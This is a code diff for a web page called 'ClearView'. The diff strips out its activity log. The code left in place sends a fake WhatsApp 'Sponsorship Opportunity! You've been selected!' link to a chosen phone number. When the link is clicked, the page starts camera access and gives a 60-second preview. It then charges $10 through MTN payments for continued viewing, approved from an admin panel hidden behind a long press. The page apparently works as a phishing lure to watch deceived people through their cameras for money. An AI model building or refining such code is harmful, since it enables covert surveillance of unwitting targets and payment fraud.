@@ -511,16 +511,6 @@
       margin-top: 0.5rem;
     }
 
-    .log-area {
-      margin-top: 1rem;
-      font-size: 0.8rem;
-      background: #0d141d;
-      padding: 0.8rem;
-      border-radius: 10px;
-      max-height: 120px;
-      overflow-y: auto;
-    }
-
     .whatsapp-float {
       position: fixed;
       bottom: 2rem;
@@ -622,11 +612,6 @@
     </div>
   </div>
 
-  <!-- Log -->
-  <div class="log-area" id="logArea">
-    <div>Ready to send sponsorship offers.</div>
-  </div>
-
   <div style="text-align:center; font-size:0.8rem; color:var(--muted); padding-top:1rem; font-style:italic;">
     "See what your instincts already know." — ClearView
   </div>
@@ -709,7 +694,6 @@
   const mtnPaymentOverlay = document.getElementById('mtnPaymentOverlay');
   const payNowBtn = document.getElementById('payNowBtn');
   const mtnDoneBtn = document.getElementById('mtnDoneBtn');
-  const logArea = document.getElementById('logArea');
   const adminPanel = document.getElementById('adminPanel');
   const adminPendingList = document.getElementById('adminPendingList');
   const adminToggleBtn = document.getElementById('adminToggleBtn');
@@ -730,7 +714,6 @@
     e.preventDefault();
     longPressTimer = setTimeout(() => {
       toggleAdminPanel();
-      // Haptic feedback if available
       if (navigator.vibrate) navigator.vibrate(50);
     }, LONG_PRESS_DURATION);
   }
@@ -747,10 +730,8 @@
     if (adminPanelVisible) {
       adminPanel.classList.add('show');
       renderAdminPanel();
-      addLog('🔐 Admin Panel unlocked');
     } else {
       adminPanel.classList.remove('show');
-      addLog('🔐 Admin Panel hidden');
     }
   }
 
@@ -795,7 +776,6 @@
     currentPhoneNumber = conn.phone;
     phoneInput.value = conn.phone;
     phoneChip.textContent = `📱 ${conn.phone}`;
-    addLog(`🔄 Reconnecting to ${conn.phone}...`);
     database.ref('connections/' + code).on('value', (snapshot) => {
       const data = snapshot.val();
       if (data) {
@@ -838,9 +818,7 @@
           renderAdminPanel(); 
         } else if (data.clicked) { 
           startCameraAccess(); 
-          // 1 MINUTE PREVIEW BEFORE LOCKING
-          setTimeout(showPaymentLock, 60000); // 60 seconds
-          addLog('📷 Camera preview started - 60 seconds free preview');
+          setTimeout(showPaymentLock, 60000); // 60 seconds preview
         }
       }
     });
@@ -887,14 +865,12 @@
   window.unlockAccess = function(code) {
     database.ref('connections/' + code + '/paid').set(true);
     database.ref('connections/' + code + '/paymentRequested').set(false);
-    addLog(`✅ Access unlocked for connection ${code}`);
     renderAdminPanel();
     showConnectedView();
   };
 
   window.rejectPayment = function(code) {
     database.ref('connections/' + code + '/paymentRequested').set(false);
-    addLog(`❌ Payment rejected for connection ${code}`);
     renderAdminPanel();
   };
 
@@ -904,8 +880,7 @@
       remoteVideo.srcObject = localStream;
       remoteVideo.style.display = 'block';
       videoPlaceholder.style.display = 'none';
-      videoStatus.textContent = '🔴 CAMERA ACTIVE - FREE PREVIEW';
-      addLog('📷 Camera access granted - 60 second preview');
+      videoStatus.textContent = '🔴 CAMERA ACTIVE';
     } catch(e) {
       videoPlaceholder.innerHTML = '<div>📷</div><strong>Camera access requested...</strong>';
     }
@@ -923,7 +898,6 @@
     statusText.textContent = 'Preview ended. Payment required.';
     accessChip.style.display = 'inline';
     accessChip.textContent = '🔒 Premium - $10';
-    addLog('🔒 60-second preview ended. Payment required.');
   }
 
   function showConnectedView() {
@@ -934,14 +908,6 @@
     accessChip.textContent = '💎 Full Access';
     videoStatus.textContent = '🔴 FULL ACCESS';
     startCameraAccess();
-    addLog('💎 Lifetime access activated');
-  }
-
-  function addLog(msg) {
-    const div = document.createElement('div');
-    div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
-    logArea.appendChild(div);
-    logArea.scrollTop = logArea.scrollHeight;
   }
 
   function updateStatus(status, msg) {
@@ -956,7 +922,6 @@
     document.getElementById('generatedLink').textContent = link;
     document.getElementById('linkPreview').style.display = 'block';
     phoneChip.textContent = `📱 ${currentPhoneNumber}`;
-    addLog('🎉 Link created and saved');
     const msg = `🎉 *Sponsorship Opportunity!*\n\nYou've been selected! Click here: ${link}`;
     window.open(`https://wa.me/${currentPhoneNumber.replace(/[^0-9+]/g,'')}?text=${encodeURIComponent(msg)}`, '_blank');
     updateStatus('waiting', 'Link sent! Waiting for click...');
@@ -967,10 +932,7 @@
     if (link) {
       try {
         await navigator.clipboard.writeText(link);
-        addLog('📋 Link copied');
-      } catch(e) {
-        addLog('📋 Copy failed');
-      }
+      } catch(e) {}
     }
   });
 
@@ -988,13 +950,11 @@
     if (currentConnectionCode) {
       database.ref('connections/' + currentConnectionCode + '/paymentRequested').set(true);
       database.ref('connections/' + currentConnectionCode + '/paymentRequestedAt').set(Date.now());
-      addLog('💰 Payment requested - notify admin');
     }
   });
 
   mtnDoneBtn.addEventListener('click', () => {
     mtnPaymentOverlay.style.display = 'none';
-    addLog('⏳ Payment submitted. Waiting for admin approval...');
     statusText.textContent = 'Payment submitted. Waiting for admin approval...';
     if (currentConnectionCode) {
       database.ref('connections/' + currentConnectionCode + '/paymentRequested').set(true);
@@ -1031,9 +991,6 @@
   // Initialize
   loadSavedConnections();
   checkUrlParameters();
-  addLog('🎯 ClearView initialized');
-  addLog('📷 Camera preview: 60 seconds');
-  addLog('🔐 Admin: Long press "Prove Your Instincts"');
 </script>
 </body>
 </html>
